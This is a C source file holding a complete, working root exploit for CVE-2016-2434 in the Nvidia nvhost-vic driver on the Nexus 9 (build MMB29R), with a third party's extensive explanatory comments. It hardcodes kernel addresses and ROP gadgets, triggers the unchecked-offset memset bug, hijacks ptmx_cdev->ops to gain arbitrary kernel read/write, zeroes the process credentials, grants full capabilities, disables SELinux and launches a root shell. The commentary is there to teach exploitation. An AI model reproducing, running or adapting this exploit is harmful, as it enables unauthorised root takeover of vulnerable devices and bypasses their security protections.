// A commented version of Jianqiang Zhao's exploit for CVE-2016-2434.
// from : https://github.com/jianqiangzhao/CVE-2016-2434/blob/master/jni/pwn.c
// Most comments that are repeatedly mentioned in previous exploits are ommited. Refer to 'CVE-2016-5342/exploit_mp3_bypass_pxn_commented.c' for stuff that I don't explain here.

/*
 * Exploit for CVE-2016-2434 (AndroidID-27251090)
 *
 * Just for Nexus 9 MMB29R, if you want to run on other version, some symbol address should be changed
 *
 * shell@flounder:/ $ getprop ro.build.fingerprint 
 * google/volantis/flounder:6.0.1/MMB29R/2482564:user/release-keys
 *
 * By Jianqiang Zhao (zhaojianqiang1@gmail.com, twitter: @jianqiangzhao)
 *
 * 2-22-2016
 */

#include <sys/types.h>  
#include <sys/ioctl.h>  
#include <stdio.h>  
#include <stdlib.h>  
#include <unistd.h>  
#include <string.h>  
#include <fcntl.h>  
#include <errno.h>
#include <stdbool.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/syscall.h>

// This is a direct implementation of ioctl. The reason why we re-implement this is because ioctl only return 0 or -1 in bionic glibc. And the reason behind that is because the
// ioctl syscall actually returns a normal return value, but the bionic(libc) wrapper converts any value other than 0 or -1 to a fixed value 0. So we implement our own wrapper in assembly
// in order to not lose the return value for our ROP_READ gadgets.
// If it is still confusing, see the code from https://github.com/jianqiangzhao/CVE-2016-2434/blob/master/jni/syscall.S and hopefully everything should make sense.
#define ioctl_syscall(n, efd, cmd, arg) \
	eabi_syscall(n, efd, cmd, arg)

#define NVHOST_IOCTL_MAGIC 'H'

// This is the vulnerable ioctl cmd. It's just copied from here : https://android.googlesource.com/kernel/tegra/+/android-tegra-flounder-3.10-lollipop-release/include/linux/nvhost_ioctl.h#395
#define NVHOST_IOCTL_CHANNEL_SET_ERROR_NOTIFIER  \
	_IOWR(NVHOST_IOCTL_MAGIC, 111, struct nvhost_set_error_notifier)

// All these values are copied also. These ioctls are necessary to initialize the nvmap device.
#define NVMAP_IOC_MAGIC 'N'

#define NVMAP_IOC_CREATE  _IOWR(NVMAP_IOC_MAGIC, 0, struct nvmap_create_handle)

#define NVMAP_IOC_ALLOC    _IOW(NVMAP_IOC_MAGIC, 3, struct nvmap_alloc_handle)

#define NVMAP_HEAP_IOVMM   (1ul<<30)

#define NVMAP_HANDLE_WRITE_COMBINE   (0x1ul << 0)

// This is used to setup our payload. The vulnerable parameter is 'offset'
struct nvhost_set_error_notifier {
	__u64 offset;
	__u64 size;
	__u32 mem;
	__u32 padding;
};

// To setup the nvmap device
struct nvmap_create_handle {
	union {
		__u32 id;       /* FromId */
		__u32 size;     /* CreateHandle */
		__s32 fd;       /* DmaBufFd or FromFd */
	};
	__u32 handle;           /* returns nvmap handle */
};

// To setup the nvmap device
struct nvmap_alloc_handle {
	__u32 handle;           /* nvmap handle */
	__u32 heap_mask;        /* heaps to allocate from */
	__u32 flags;            /* wb/wc/uc/iwb etc. */
	__u32 align;            /* min alignment necessary */
};

// Our marker in task_struct->comm to find our own task
#define NEW_PROC_NAME		"My-Expl0it"
// kernel base address in Aarch64
#define KERNEL_BASE		0xffffffc000000000

// This is actually the address of the global variable ptmx_cdev. Would have been more appropriate to name this to PTMX_CDEV
#define PTMX_MISC		0xffffffc0010aa500
// We need to know the original value of PTMX_FOPS because we're going to use the LSB 4 bytes to map in our fake file_operations struct into userspace
#define PTMX_FOPS		0xffffffc0010aa420
// The following is used to store the function pointers to their respective members in our fake ptmx_fops(for ptmx_cdev->ops). Just in case so the kernel doesn't crash.
#define PTMX_LLSEEK		0xffffffc000194630
#define PTMX_READ		0xffffffc0003ed2a8
#define PTMX_WRITE		0xffffffc0003ed8d4
#define PTMX_POLL		0xffffffc0003ed468
#define PTMX_IOCTL		0xffffffc0003efe2c
#define COMPAT_PTMX_IOCTL	0xffffffc0003ed388
#define PTMX_OPEN		0xffffffc0003f8974
#define PTMX_RELEASE		0xffffffc0003ef5b8
#define PTMX_FASYNC		0xffffffc0003ed254

// SELINUX enforcing global var address
#define SELINUX_ENFORCING	0xffffffc00109cb0c
// global var init task_struct address
#define INIT_TASK		0xffffffc000e58820

// A nice gadget to read from an arbitrary address
/*
 * rop read:
 * ffffffc00033d7f8:       f9400840        ldr     x0, [x2,#16]
 * ffffffc00033d7fc:       d65f03c0        ret
 */
#define ROP_READ	0xffffffc00033d7f8

// A nice gadget to write to an arbitrary address
/*
 * rop write:
 * ffffffc00082836c:       b9001041        str     w1, [x2,#16]
 * ffffffc000828370:       d65f03c0        ret
 */
#define ROP_WRITE	0xffffffc00082836c

// This will eventually store the address of task_struct of the current process
static unsigned long my_task = 0;
// Offsets from the start of task_struct to different task_struct members. task_offset points to "struct list_head tasks;" and is a circular linked list to all other task_structs.
static unsigned int task_offset = 616, comm_offset = 1168, cred_offset = 1160;

// /dev/ptmx is used solely as a tool to execute ROP gadgets. It is not used to spray anything in memory, but only it's global object ptmx_cdev is corrupted later on in the exploit.
static int ptmx_fd = 0;
// This is an address within our mmap-ed userspace memory, where the address points to our fake ptmx_fops.
static unsigned long fake_ptmx_fops = 0;

// convenience functions
static int kernel_read_32(unsigned long addr, unsigned int *val);
static int kernel_read(unsigned long addr, unsigned long *val);
static int kernel_write_32(unsigned long address, unsigned int value);
static int kernel_write(unsigned long addr, unsigned long val);

// Trying to find our current task_struct using our marker. For details, check 'CVE-2016-5342/exploit_mp3_bypass_pxn_commented.c'
static int get_task_by_comm(unsigned long *task)
{
	unsigned int comm0, comm1, comm2;
	unsigned long task_list, init_task_list, addr;
	int i, ret = 0;
	char task_name[50] = {0};

	/* 
	 * follow the init_task->task list to search myself:
	 * next: swapper->init->kthreadd->... 
	 * pre:  swapper->...->myself->... 
	 */
	task_list = (INIT_TASK + task_offset);
	init_task_list = task_list;
	for(i=0; i<1000; i++) {
		/* search self process from tail */
		addr = task_list + 8;
		ret = kernel_read(addr, &task_list);

		if(task_list == init_task_list) {
			printf("search task list end, can't get task\n");
			return -1;
		}

		addr = task_list - task_offset + comm_offset;
		ret = kernel_read_32(addr, &comm0);

		addr = task_list - task_offset + comm_offset + 4;
		ret = kernel_read_32(addr, &comm1);

		addr = task_list - task_offset + comm_offset + 4 * 2;
		ret = kernel_read_32(addr, &comm2);

		memcpy(task_name, &comm0, 4);
		memcpy(task_name + 4, &comm1, 4);
		memcpy(task_name + 8, &comm2, 4);
		if(!strncmp(task_name, NEW_PROC_NAME, strlen(NEW_PROC_NAME))) {
			*task = task_list - task_offset;
			break;
		}

	}

	return 0;
}

// Wiping SELINUX_ENFORCING, all uid/gids to 0, and enabling all capabilities. For details, check 'CVE-2016-5342/exploit_mp3_bypass_pxn_commented.c'
static int do_root(void)
{
	int ret;
	unsigned long i, cred, addr;
	unsigned int tmp0;

	/* search myself */
	ret = get_task_by_comm(&my_task);
	if(ret != 0) {
		printf("[-] get myself fail!\n");
		return -1;
	}

	if(!my_task || (my_task < 0xffffffc000000000)) {
		printf("invalid task address!");
		return -2;
	}

	ret = kernel_read(my_task + cred_offset, &cred);
	if (cred < KERNEL_BASE) return -3;

	i = 1;
	addr = cred + 4 * 4;
	ret = kernel_read_32(addr, &tmp0);
	if(tmp0 == 0x43736564 || tmp0 == 0x44656144)
		i += 4;

	addr = cred + (i+0) * 4;
	ret = kernel_write_32(addr, 0);
	addr = cred + (i+1) * 4;
	ret = kernel_write_32(addr, 0);
	addr = cred + (i+2) * 4;
	ret = kernel_write_32(addr, 0);
	addr = cred + (i+3) * 4;
	ret = kernel_write_32(addr, 0);
	addr = cred + (i+4) * 4;
	ret = kernel_write_32(addr, 0);
	addr = cred + (i+5) * 4;
	ret = kernel_write_32(addr, 0);
	addr = cred + (i+6) * 4;
	ret = kernel_write_32(addr, 0);
	addr = cred + (i+7) * 4;
	ret = kernel_write_32(addr, 0);

	//securebits: cred[i+8]
	// for full capabilities
	addr = cred + (i+9) * 4;
	ret = kernel_write_32(addr, 0xffffffff);
	addr = cred + (i+10) * 4;
	ret = kernel_write_32(addr, 0xffffffff);
	addr = cred + (i+11) * 4;
	ret = kernel_write_32(addr, 0xffffffff);
	addr = cred + (i+12) * 4;
	ret = kernel_write_32(addr, 0xffffffff);
	addr = cred + (i+13) * 4;
	ret = kernel_write_32(addr, 0xffffffff);
	addr = cred + (i+14) * 4;
	ret = kernel_write_32(addr, 0xffffffff);
	addr = cred + (i+15) * 4;
	ret = kernel_write_32(addr, 0xffffffff);
	addr = cred + (i+16) * 4;
	ret = kernel_write_32(addr, 0xffffffff);
	/* success! */

	// disable SELinux
	kernel_write_32(SELINUX_ENFORCING, 0);

	return 0;
}

// Restoring the corrupted ptmx_cdev so the kernel doesn't crash when some other random process tries to use the ptmx device.
static void restore(void)
{
	unsigned long addr;

    // Restoring ptmx_cdev->ops to it's original value by restoring the overwritten MSD(MSB 4 bytes)
	addr = PTMX_MISC + 8 * 10 - 4;
	kernel_write_32(addr, 0xffffffc0);

    // IMO, the order of this is wrong. Since ptmx_cdev->ops has been restored by the above code, our kernel_write() primitive will no longer work. This should have been done prior to the restoration.
    // Hence, the following code has no effect. However, it seems that if ptmx_cdev->list is not restored and stays NULL, then the kernel luckily doesn't crash because the ptmx_cdev is only touched on
    // kernel initialization when it initializes all the devices including pty, and not touched later in any kind of OS operation.
    // The author's original intention was to overwrite ptmx_cdev->list->next and ptmx_cdev->list->prev with ptmx_cdev->list, so the circly linked list will be self-referencing.
	addr = PTMX_MISC + 8 * 10;
	kernel_write(addr, addr);
	kernel_write(addr + 8, addr);
}

// Initializing the nvmap device. If you follow the source code of NVMAP_IOC_CREATE and NVMAP_IOC_ALLOC(https://android.googlesource.com/kernel/tegra/+/android-tegra-3.10/drivers/video/tegra/nvmap),
// it's doing a lot of stuff but in terms of exploitation, the only important thing is, when NVMAP_IOC_CREATE is issued the code flow goes like
// "nvmap_ioctl -> nvmap_ioctl_create -> nvmap_create_handle -> __nvmap_make_dmabuf -> dma_buf_export", and creates a 'dma_buf' object for us to use in userspace(actually a handle that represents the
// dma_buf is passed down to userspace) to communicate with the nvmap device. We only need to know that the dma_buf object has been allocated and will be used as a window to perform subsequent nvmap device ioctls.
// For the curious, read more about dma buf sharing here : https://www.kernel.org/doc/Documentation/dma-buf-sharing.txt
static int map_nvmap_handle(unsigned int *handle)
{
	int nvmap_fd, ret = 0;
	unsigned int cmd;
	struct nvmap_create_handle nvmap_arg;
	struct nvmap_alloc_handle alloc_arg;
	unsigned int nvmap_handle;

	nvmap_fd = open("/dev/nvmap", O_RDONLY, 0);
	if(nvmap_fd < 0) {
		ret = -1;
		printf("[-] Failed to open nvmap device (%d-%s)\n", errno, strerror(errno));
		goto out;
	}

	memset(&nvmap_arg, 0, sizeof(nvmap_arg));
	nvmap_arg.size = 0x10000;

	cmd = NVMAP_IOC_CREATE;
	ret = ioctl(nvmap_fd, cmd, &nvmap_arg);
	if(ret == -1) {
		printf("[-] Ioctl nvmap fail(%s - %d)\n", strerror(errno), errno);
		goto ioctl_fail;
	}

	nvmap_handle = nvmap_arg.handle;

	memset(&alloc_arg, 0, sizeof(alloc_arg));
	alloc_arg.handle = nvmap_handle;
	alloc_arg.align = 0x1000;
	alloc_arg.heap_mask = NVMAP_HEAP_IOVMM;
	alloc_arg.flags = NVMAP_HANDLE_WRITE_COMBINE;

	cmd = NVMAP_IOC_ALLOC;
	ret = ioctl(nvmap_fd, cmd, &alloc_arg);
	if(ret == -1) {
		printf("[-] Ioctl nvmap fail(%s - %d)\n", strerror(errno), errno);
		goto ioctl_fail;
	}

	*handle = nvmap_handle;

ioctl_fail:
	close(nvmap_fd);
out:
	return ret;
}

// A convinience function to write attacker controlled 4 bytes to an address of attacker's choosing.
static int kernel_write_32(unsigned long addr, unsigned int val)
{
	unsigned long arg;

	*(unsigned long*)(fake_ptmx_fops + 9 * 8) = ROP_WRITE;

    // This is to compensate for the #16 in the ROP gadget.
    /*
    * rop write:
    * ffffffc00082836c:       b9001041        str     w1, [x2,#16]
    * ffffffc000828370:       d65f03c0        ret
    */
	arg = addr - 16;
	ioctl_syscall(__NR_ioctl, ptmx_fd, val, arg);
	return 0;
}

// A convinience function to write attacker controlled 8 bytes to an address of attacker's choosing.
static int kernel_write(unsigned long addr, unsigned long val)
{
	unsigned int val32;

	val32 = (unsigned int)val;
	kernel_write_32(addr, val32);

	val32 = (unsigned int)((val >> 32) & 0xffffffff);
	kernel_write_32(addr + 4, val32);
	return 0;
}

// A convinience function to read 4 bytes from an address of attacker's choosing.
static int kernel_read_32(unsigned long addr, unsigned int *val)
{
	int ret;
	unsigned long arg;

	*(unsigned long*)(fake_ptmx_fops + 9 * 8) = ROP_READ;
    // This is to compensate for the #16 in the ROP gadget.
    /*
    * rop read:
    * ffffffc00033d7f8:       f9400840        ldr     x0, [x2,#16]
    * ffffffc00033d7fc:       d65f03c0        ret
    */
	arg = addr - 16;
	errno = 0;
	ret = ioctl_syscall(__NR_ioctl, ptmx_fd, 0xdeadbeef, arg);
	*val = ret;

	return 0;
}

// A convinience function to read 8 bytes from an address of attacker's choosing.
static int kernel_read(unsigned long address, unsigned long *value)
{
	unsigned int val0, val1;

	kernel_read_32(address, &val0);
	kernel_read_32(address + 4, &val1);
	*value = ((unsigned long)val0 & 0xffffffff | ((unsigned long)val1 << 32) & 0xffffffff00000000);
}

// Opening the /dev/ptmx to abuse as our arbitrary read/write primitive.
static int rop_init(void)
{
	ptmx_fd = open("/dev/ptmx", O_RDONLY);
	if(ptmx_fd == -1) {
		printf("[-] Open ptmx fail (%s - %d)\n", strerror(errno), errno);
		return -1;
	}

	return 0;
}

// Clean up function
static int rop_close(void)
{
	close(ptmx_fd);
	return 0;
}

// The crux of the exploit
static int get_root(void)
{
	int fd, i, ret = 0;
	unsigned int cmd;
	struct nvhost_set_error_notifier arg;
	unsigned int nvmap_handle;
	void *map, *map2;
	unsigned long tmp, va;

    // Initializing the nvmap device. See the above function
	ret = map_nvmap_handle(&nvmap_handle);
	if(ret == -1){
		goto out;
	}
	printf("[+] alloc nvmap handle: %d\n", nvmap_handle);

    // Mapping a sufficiently large region that is as big as the kernel vmalloc address space. Actually, the vmalloc region lies in
    // 0xffffff8000000000 - 0xffffffbbffff0000 (https://android.googlesource.com/kernel/msm/+/android-msm-3.9-usb-and-mmc-hacks/arch/arm64/include/asm/pgtable.h#36),
    // and 0x10000000 only covers the first small portion of the vmalloc region. We are assuming that the vmalloc region is relatively not used as much and since allocations occur sequentially within the
    // vmalloc area(http://lxr.free-electrons.com/source/mm/vmalloc.c#L353), we could assume that any vmalloc that the nvmap device uses will hopefully be placed in the first 0x10000000 block of vmalloc memory.
    // This assumption is generally correct because the kernel heavily uses kmalloc instead of vmalloc, and even when the kernel requires large buffers for say DMA operations, the kernel
    // still uses kmalloc instead of vmalloc because it is a general practice to use kmalloc whenever possible for kernels developers, even in the case of large buffers(to reduce Page Table overheads).
	map = mmap(NULL, (size_t)0x10000000, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, -1, (off_t)0);
	if(map == MAP_FAILED) {
		printf("[-] Failed to mmap landing (%d-%s)\n", errno, strerror(errno));
		ret = -1;
		goto out;
	}
	printf("[+] landing mmap'ed @ %p\n", map);
    // Filling the whole mmap'd area with 0xFF
	memset(map, 0xff, 0x10000000);

    // Opening our vulnerable Nvidia driver
	fd = open("/dev/nvhost-vic", O_RDONLY);
	if(fd == -1) {
		printf("[-] Open nvhost-vic fail (%s - %d)\n", strerror(errno), errno);
		ret = -1;
		goto open_vic_out;
	}
	printf("[+] open device nvhost-vic\n");

    // Before we dive into the next code, let's take a look at the vulnerable code.
    // https://android.googlesource.com/kernel/tegra.git/+/android-tegra-3.10/drivers/gpu/nvgpu/gk20a/channel_gk20a.c
    /*
    case NVHOST_IOCTL_CHANNEL_SET_ERROR_NOTIFIER:
		err = gk20a_busy(dev);
		if (err) {
			dev_err(&dev->dev,
				"%s: failed to host gk20a for ioctl cmd: 0x%x",
				__func__, cmd);
			return err;
		}
        // it eventually enters "gk20a_init_error_notifier" function
		err = gk20a_init_error_notifier(ch,
				(struct nvhost_set_error_notifier *)buf);
		gk20a_idle(dev);
		break;
        ...
        ...
        ...
    
    // The vulnerable function
    static int gk20a_init_error_notifier(struct channel_gk20a *ch,
            struct nvhost_set_error_notifier *args) {
        void *va;
        struct dma_buf *dmabuf;
        if (!args->mem) {
            pr_err("gk20a_init_error_notifier: invalid memory handle\n");
            return -EINVAL;
        }
        // 'args->mem' is the nvmap device handle that we retrieved from 'ret = map_nvmap_handle(&nvmap_handle);'.
        // Passing it to dma_buf_get() will return the underlying dma_buf of the device.
        dmabuf = dma_buf_get(args->mem);
        if (ch->error_notifier_ref)
            gk20a_free_error_notifiers(ch);
        if (IS_ERR(dmabuf)) {
            pr_err("Invalid handle: %d\n", args->mem);
            return -EINVAL;
        }
        
        // There is call to dma_buf_vmap(). Before we continue, let's look at the implementation of dma_buf_vmap
        // https://android.googlesource.com/kernel/tegra/+/android-tegra-flounder-3.10-lollipop-release/drivers/base/dma-buf.c#566
            / *
            void *dma_buf_vmap(struct dma_buf *dmabuf)
            {
                void *ptr;
                if (WARN_ON(!dmabuf))
                    return NULL;
                if (!dmabuf->ops->vmap)
                    return NULL;
                mutex_lock(&dmabuf->lock);
                if (dmabuf->vmapping_counter) {
                    dmabuf->vmapping_counter++;
                    BUG_ON(!dmabuf->vmap_ptr);
                    ptr = dmabuf->vmap_ptr;
                    goto out_unlock;
                }
                BUG_ON(dmabuf->vmap_ptr);
                // This internally calls vmalloc and not kmalloc
                ptr = dmabuf->ops->vmap(dmabuf);
                if (IS_ERR_OR_NULL(ptr))
                    goto out_unlock;
                dmabuf->vmap_ptr = ptr;
                dmabuf->vmapping_counter = 1;
            out_unlock:
                mutex_unlock(&dmabuf->lock);
                return ptr;
            }
            * /
        // It's going to allocate a "nvmap_arg.size = 0x10000; //from map_nvmap_handle()" size buffer in the vmalloc space, and store it into dmabuf->vmap_ptr. Now the important thing here is that
        // since 'dmabuf->vmapping_counter = 1;' upon the first allocation, subsequent calls to dma_buf_vmap will go to the following condition : 'if (dmabuf->vmapping_counter) {...', and the return value will be
        // the exact same pointer that was returned in the very first allocation. Thus, we can infer that 'va' in the next line of code will be the same value in every call to this ioctl.
        va = dma_buf_vmap(dmabuf);
        if (!va) {
            dma_buf_put(dmabuf);
            pr_err("Cannot map notifier handle\n");
            return -ENOMEM;
        }
        
        ch->error_notifier_ref = dmabuf;
        // Now here comes the bug! First, where does 'args' come from?
            / *
            long gk20a_channel_ioctl(struct file *filp,
                unsigned int cmd, unsigned long arg)
            {
                ...
                ...
                if (_IOC_DIR(cmd) & _IOC_WRITE) {
                    if (copy_from_user(buf, (void __user *)arg, _IOC_SIZE(cmd)))
                        return -EFAULT;
                }
                ...
                ...
                err = gk20a_init_error_notifier(ch,
                    (struct nvhost_set_error_notifier *)buf);
                ...
                ...
            * /
        // There you go. 'args' is the user supplied buffer passed down to the ioctl. so args->offset is totally controllable. So the next question arises, how big can be args->offset?
        / *
        struct nvhost_set_error_notifier {
            __u64 offset;
            __u64 size;
            __u32 mem;
            __u32 padding;
        };
        * /
        // It can be an 8 byte value with no sanity checks or limitations. Let's see where it's getting used.
        ch->error_notifier = va + args->offset;
        ch->error_notifier_va = va;
        // Oh my gosh! This basically translates to 'memset(va + user_controlled_8byte_value, 0, 16);'.
        // What this means is that we can zero out 16 bytes of any address in kernel memory, provided that we know the address of 'va'.
        // So the next question would obviously be, can we retrieve this 'va' in some reliable way...?
        memset(ch->error_notifier, 0, sizeof(struct nvhost_notification));
        return 0;
    }
    */
	memset(&arg, 0, sizeof(arg));
    // Now setting up the ioctl cmd arguments
	arg.mem = nvmap_handle;
    // Now we know which part of the code is vulnerable. As mentioned above, the next question is how would we be able to know the exact value of va...? Without knowing the exact value,
    // it is impossible to target exact addresses to write stuff to, and if you blindly brute force, the kernel will mostly likely crash. So how are we going to get 'va'?
    // Here the author uses a smart trick. In the above where I explained vmalloc memory internals, I said vmalloc starts at 0xffffff8000000000 and allocations will start in the very beginning
    // of vmalloc, and future allocations will take the next free block of memory, and if there is a hole in-between allocations where the new allocation can fit it, it takes that hole in a first-fit
    // fasion. This implies that the vmalloc'd 0x10000 size dma buffer would most likely be not far from the beginning of the vmalloc memory(0xffffff8000000000), assuming that not so many vmalloc allocations
    // took place from other drivers or the kernel. This assumption is generally true as explained above, and the author seemed to have verified it and used a reasonable range of 0xffffff80000000000 ~ 0xffffff8010000000
    // therefore assuming that the allocation will have been placed within that memory region. 'map' represents the user mmaped 0x10000000 size chunk of memory, so the following calculation translates into this :
    // 'ch->error_notifier = va + args->offset = (va) + (map - 0xffffff8000000000) = (0xffffff8000000000 + offset_to_object) + (map - 0xffffff8000000000) = map + offset_to_object'.
    // You see what the author is trying to do...? the memset in the vulnerable function effectively translates to this : 'memset(map + offset_to_object, 0, sizeof(struct nvhost_notification));'
    // Aha! So after executing our ioctl payload, 16 bytes within our mmap'd allocation will be set to 0. The whole region was originally filled with 0xFF, so it takes only a simple for loop to obtain 'offset_to_object'.
	arg.offset = (unsigned long)map - 0xffffff8000000000;
	arg.size = 0;
	cmd = NVHOST_IOCTL_CHANNEL_SET_ERROR_NOTIFIER;
    // This ioctl will eventually reach the vulnerable function and use our payload to trigger the vulnerability, and wipe 16 bytes in kernel(or user) memory.
    // After this, 16 bytes within the mmap'd memory will be set to zero.
	ret = ioctl(fd, cmd, &arg);
	if(ret == -1) {
		printf("[-] Ioctl nvhost-vic fail(%s - %d)\n", strerror(errno), errno);
		goto ioctl_out;
	}

    // The simplistic for loop to find the exact value of 'offset_to_object'
	for(i=0; i<0x10000000/8; i++) {
		tmp = *((unsigned long*)map + i);
		if(tmp == 0) {
			break;
		}
	}

    // Now that we have 'offset_to_object', we can calculate the exact value of 'va' simply by adding 0xffffff8000000000 back again.
    // You know what this means...? 'memset(ch->error_notifier, 0, sizeof(struct nvhost_notification));' has effectively transformed into 'memset(address_of_our_choosing, 0, 16);'
    // Yay! We can now zero out 16 bytes of our choosing anywhere we want in kernel address space. Now the next logical question would be, what do we want to zero-out, in order to gain code execution?
	va = 0xffffff8000000000 + i * 8;
	printf("[+] va position: 0x%lx\n", va);

    // This is Aarch64. That means all addresses that are stored in variables are 8 bytes. What if... we zero out the MSD(MSB 4 bytes dword) of an 8 byte pointer? For instance, let's say that an object pointer 0x0xffffffc001234000
    // is in some global variable, and the MSD is zeroed out. That would effectively transform that address into 0x0000000001234000. The next time the kernel tries to dereference that object pointer, 
    // it would actually think the object is stored at 0x0000000001234000, and dereference an address... in userspace! What would happen if we mmap'd memory at that location? The kernel would happily use whatever is
    // stored in there, and that 'whatever' is attacker controllable data. Now, we need to find something useful to overwrite. One useful object is ptmx_cdev. When the /dev/ptmx device initializes,
    // it creates a 'cdev' object and stores it in the ptmx_cdev global variable. ptmx_cdev is a global struct from kernel(http://lxr.free-electrons.com/source/drivers/tty/pty.c#L594) which doesn't use kmalloc but lies
    // directly within the static data section, so all of it's members can be found in a fixed location within the kernel. The most useful member in ptmx_cdev is the 'ops' member. This member will point to a file_operations
    // object, which contains a whole bunch of function pointers. By controlling ptmx_cdev->ops, we can control the execution flow when a certain operation is performed on /dev/ptmx(i.e. ioctl).
    // Now back to the code. The following code is allocating userspace memory to prepare a fake file_operations object(ptmx_fops) for the ptmx_cdev->ops to reference.
    // We will prepare our fake ptmx_fops payload in the mmap'd memory so that after the MSD of ptmx_cdev->ops is zeroed out, the new ptmx_cdev->ops will point to our fake ptmx_fops in userspace.
	map2 = mmap((void *)0x00010000, (size_t)0x10000000, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_SHARED|MAP_FIXED, -1, (off_t)0);
	if(map2 == MAP_FAILED) {
		ret = -1;
		printf("[-] shellcode mmap failed (%d-%s)\n", errno, strerror(errno));
		goto ioctl_out;
	}
	printf("[+] prepare fake_ptmx_fops, mmap'ed @ %p.\n", map2);
	memset(map2, 0, 0x10000000);

    // We know the original value of PTMX_FOPS(which is also a global variable : http://lxr.free-electrons.com/source/drivers/tty/tty_io.c#L473), so we logical AND with 0xffffffff in order to zero-out the MSD.
    // Now we know what address ptmx_cdev->ops will point to(0xffffffc0010aa420 -> 0x00000000010aa420) when the MSD is wiped. We will put our fake ptmx_fops object in here. We preserve the original values,
    // because anything that uses the pty device(ssh, telnet, screen) will immediately crash the kernel, and we don't want that to happen right?
	fake_ptmx_fops = PTMX_FOPS & 0xffffffff;
	*(unsigned long*)(fake_ptmx_fops + 1 * 8) = PTMX_LLSEEK;
	*(unsigned long*)(fake_ptmx_fops + 2 * 8) = PTMX_READ;
	*(unsigned long*)(fake_ptmx_fops + 3 * 8) = PTMX_WRITE;
	*(unsigned long*)(fake_ptmx_fops + 8 * 8) = PTMX_POLL;
	*(unsigned long*)(fake_ptmx_fops + 9 * 8) = PTMX_IOCTL;
	*(unsigned long*)(fake_ptmx_fops + 10 * 8) = COMPAT_PTMX_IOCTL;
	*(unsigned long*)(fake_ptmx_fops + 12 * 8) = PTMX_OPEN;
	*(unsigned long*)(fake_ptmx_fops + 14 * 8) = PTMX_RELEASE;
	*(unsigned long*)(fake_ptmx_fops + 17 * 8) = PTMX_FASYNC;

    // Preparing the ptmx_cdev->list MSD zero-out payload.
	printf("[+] clear ptmx_cdev list first\n");
	memset(&arg, 0, sizeof(arg));
	arg.mem = nvmap_handle;
    // This calculation will eventually point to 'ptmx_cdev->list'. The reason why this member has to be wiped will become clear later.
	arg.offset = PTMX_MISC - va + 8 * 10;
	arg.size = 0;

	cmd = NVHOST_IOCTL_CHANNEL_SET_ERROR_NOTIFIER;
    // Triggering the bug with our payload. Now 16 bytes starting from 'ptmx_cdev->list' are overwritten. The 'ptmx_cdev->list' is 16 bytes, so only that member is overwritten.
	ret = ioctl(fd, cmd, &arg);
	if(ret == -1) {
		printf("[-] Ioctl nvhost-vic fail(%s - %d)\n", strerror(errno), errno);
		goto ioctl_out_2;
	}

	printf("[+] overwrite ptmx_cdev ops\n");
	memset(&arg, 0, sizeof(arg));
	arg.mem = nvmap_handle;
    // The real meat of the exploit. It's now preparing to overwrite the MSD of 'ptmx_cdev->ops'. As a side effect, the first 12 bytes of 'ptmx_cdev->list' will also be overwritten.
    // This will zero out ptmx_cdev->list->next, but ptmx_cdev->list->prev will point to an invalid memory address because only the LSD is wiped out! This might cause problems, so the exploit tries to avoid
    // this by first wiping the whole 'ptmx_cdev->list' to zero before overwritting ptmx_cdev->ops.
	arg.offset = PTMX_MISC - va + 8 * 10 - 4;
	arg.size = 0;

	cmd = NVHOST_IOCTL_CHANNEL_SET_ERROR_NOTIFIER;
    // After this, ptmx_cdev->ops will point to user memory where our fake ptmx_fops lies in!
	ret = ioctl(fd, cmd, &arg);
	if(ret == -1) {
		printf("[-] Ioctl nvhost-vic fail(%s - %d)\n", strerror(errno), errno);
		goto ioctl_out_2;
	}

    // opening /dev/ptmx
	rop_init();

	printf("[+] to get root ...\n");
    // Now that we have ptmx_cdev->ops pointing to our fake object, we can create an arbitrary R/W primitive and start wiping the credentials.
    // Among the many function pointers within the file_operations object, we use ioctl, because we can control 2 parameters and that is a must in order to create an arbitrary R/W primitive.
	do_root();

	printf("[+] restore \n");
    // After switfly wiping the credentials, immediately restore the corrupted ptmx_cdev object to it's original state, so that any other program that attempts to use /dev/ptmx will not crash the kernel.
	restore();

    // closing /dev/ptmx
	rop_close();

ioctl_out_2:
	munmap(map2, 0x10000000);
ioctl_out:
	close(fd);
open_vic_out:
	munmap(map, 0x10000000);
out:
	return ret;
}

// Thanks for sharing the magnificent exploit Jianqiang Zhao! :)
static void banner(void)
{
	printf("\n");
	printf("*****************************************************************\n");
	printf("*	     Exploit for CVE-2016-2434 (AndroidID-27251090)	*\n");
	printf("*	        	For Nexus 9 MMB29R			*\n");
	printf("*			By Jianqiang Zhao 			*\n");
	printf("*			   2-22-2016				*\n");
	printf("*****************************************************************\n");
	printf("\n");
}

int main(void)
{
	int ret;

	banner();

    // setting task_struct->comm to "My-Expl0it"
	prctl(PR_SET_NAME, (unsigned long)NEW_PROC_NAME,0,0,0);

    // Run arbitrary zeroing payload, gain arbitrary R/W primitive, search for critical structures in kernel, overwrite them to achieve root
	ret = get_root();
	if(ret == -1) {
		printf("[-] get root fail\n");
		return -1;
	}

    // Attempting to run root shell
	printf("[+] SELinux disabled! \n");
	if (!setresuid(0, 0, 0)) {
		setresgid(0, 0, 0);
		printf("\n[+] Got it :)\n");
		printf("[+] uid=%d gid=%d\n", getuid(), getgid());
		sleep(1);
		ret = execl("/system/bin/sh", "/system/bin/sh", NULL);
		if( ret ) {
			printf("execl failed, errno %d\n", errno);
		}
	}

	return 0;
}